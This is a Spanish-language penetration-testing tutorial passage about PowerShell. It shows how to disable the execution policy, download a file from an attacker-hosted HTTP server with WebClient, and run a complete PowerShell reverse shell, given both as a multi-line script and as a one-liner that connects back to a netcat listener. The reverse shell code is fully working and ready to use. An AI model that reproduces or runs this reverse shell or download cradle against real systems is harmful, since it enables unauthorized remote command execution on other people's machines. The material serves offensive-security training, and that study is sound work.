# 1.2.3 PowerShell and Powercat

PowerShell es una solución de automatización de tareas multiplataforma formada por un shell de línea de comandos, un lenguaje de scripting y un marco de administración de configuración. PowerShell funciona en Windows 10, Linux y macOS.

{% embed url="https://docs.microsoft.com/es-es/powershell/scripting/overview?view=powershell-7.1" %}

PowerShell mantiene una directiva de ejecución que determina qué tipo de scripts de PowerShell (si los hay) se pueden ejecutar en el sistema. La directiva predeterminada es "Restricted", lo que significa que el sistema no cargará archivos de configuración de PowerShell ni ejecutará scripts de PowerShell. Necesitaremos establecer una política de ejecución "Unrestricted" en nuestra máquina cliente de Windows. Se realiza de la siguiente manera, confirmaremos con la tecla \[S] (se necesitan permisos de administrador para realizar esta acción):

```
PS C:\Windows\system32> Set-ExecutionPolicy Unrestricted

Cambio de directiva de ejecución
Lativa de ejecución te ayuda a protegerte de scripts en los que no confías. Si cambias dicha directiva, podrías exponerte a los riesgos de seguridad descritos en el tema de la Ayuda
about_Execution_Policies en https:/go.microsoft.com/fwlink/?LinkID=135170. ¿Quieres cambiar la directiva de ejecución?
[S] Sí  [O] Sí a todo  [N] No  [T] No a todo  [U] Suspender  [?] Ayuda (el valor predeterminado es "N"): S

PS C:\Windows\system32>
```

Podemos verificar la directiva.

```
PS C:\Windows\system32>  Get-ExecutionPolicy
Unrestricted
```

### Transferencias de archivos con PowerShell

Debido a la potencia y flexibilidad de PowerShell, esto no es tan sencillo como lo sería con Netcat o incluso socat, lo que hace que estos primeros comandos sean un poco confusos a primera vista. Ejecutaremos el comando y luego desglosaremos los componentes:

```
PS C:\Users\guillermo> powershell -c "(new-object System.Net.WebClient).DownloadFile('http://192.168.100.23/wget.exe','C:\Users\guillermo\Downloads\wget.exe')"
PS C:\Users\guillermo> cd .\Downloads\
PS C:\Users\guillermo\Downloads> ls


    Directorio: C:\Users\guillermo\Downloads


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----     19/10/2021  11:35 p. m.         308736 wget.exe


PS C:\Users\guillermo\Downloads>
```

Antes de realizar la descarga debemos de abrir un servidor http en nuestra máquina.

{% tabs %}
{% tab title="Python 3" %}
python3 -m http.server 80
{% endtab %}

{% tab title="Python 2" %}
python2 -m SimpleHTTPServer 80
{% endtab %}

{% tab title="php" %}
php -S 0.0.0.0:80
{% endtab %}
{% endtabs %}

Podemos ver que el comando se ejecutó, el archivo se transfirió y se ejecuta sin incidentes. Analicemos el comando de PowerShell que hizo que esto sucediera. Primero, usamos la opción **`-c`**. Esto ejecutará el comando entre comillas dobles como si se escribiera en el símbolo del sistema de PowerShell.

El comando que estamos ejecutando contiene varios componentes. En primer lugar, estamos usando el cmdlet "**`new-object`**", que nos permite crear instancias de un objeto .Net o COM. En este caso, estamos creando una instancia de la clase **`WebClient`**, que se define e implementa en S**`ystem.Net`** Espacio de nombres.

{% embed url="https://docs.microsoft.com/es-mx/dotnet/api/system.net?view=netframework-4.7.2" %}

La clase **`WebClient`** se utiliza para acceder a los recursos identificados por un URI y expone un método público llamado **`DownloadFile`**, que requiere nuestros dos parámetros clave: **`una ubicación de origen`** (en forma de URI como dijimos anteriormente) y **`una ubicación de destino`** donde se almacenarán los datos recuperados.

{% embed url="https://docs.microsoft.com/es-mx/dotnet/api/system.net.webclient?view=netframework-4.7.2" %}

{% embed url="https://docs.microsoft.com/es-mx/dotnet/api/system.net.webclient.downloadfile?view=netframework-4.7.2" %}

### PowerShell Reverse Shells

Nos ponemos en escucha con netcat:

```
$ nc -lvnp 7777
```

A continuación, enviaremos una reverse shell de PowerShell desde windows. Nuevamente, esto no es sintácticamente tan limpio como Netcat o socat, pero dado que PowerShell es nativo en la mayoría de las máquinas modernas de Windows, es importante que exploremos este equivalente de PowerShell. Para comenzar, echemos un vistazo al código y luego desglosémoslo:

```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',443);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
{
 $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
 $sendback = (iex $data 2>&1 | Out-String );
 $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
 $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
 $stream.Write($sendbyte,0,$sendbyte.Length);
 $stream.Flush();
}
$client.Close();
```

Esto puede parecer extremadamente complejo en comparación con las herramientas anteriores que hemos utilizado. Sin embargo, PowerShell es potente y flexible; no es una herramienta de una sola función. Debido a esto, debemos usar una sintaxis compleja para invocar una funcionalidad compleja.

Primero, vemos una variable de **`$client`**, a la que se le asigna la dirección IP de destino, una variable de flujo **`$stream`**, un arreglo de bytes llamada **`$bytes`** y un bucle de tiempo seguido de una llamada para cerrar la conexión del cliente. Dentro del bucle while, podemos ver varias líneas responsables de leer y escribir datos en el flujo de red. Tenga en cuenta que el cmdlet **`iex`** ("Invoke-Expression") es una parte clave de este fragmento de código, ya que ejecuta cualquier cadena que reciba como comando y los resultados del comando se redirigen y se envían de vuelta a través de la secuencia de datos.

Este código se puede ejecutar en una línea de una sola línea ciertamente larga que se ejecutará en el símbolo del sistema:

```
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.011.0.4',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i =$stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```





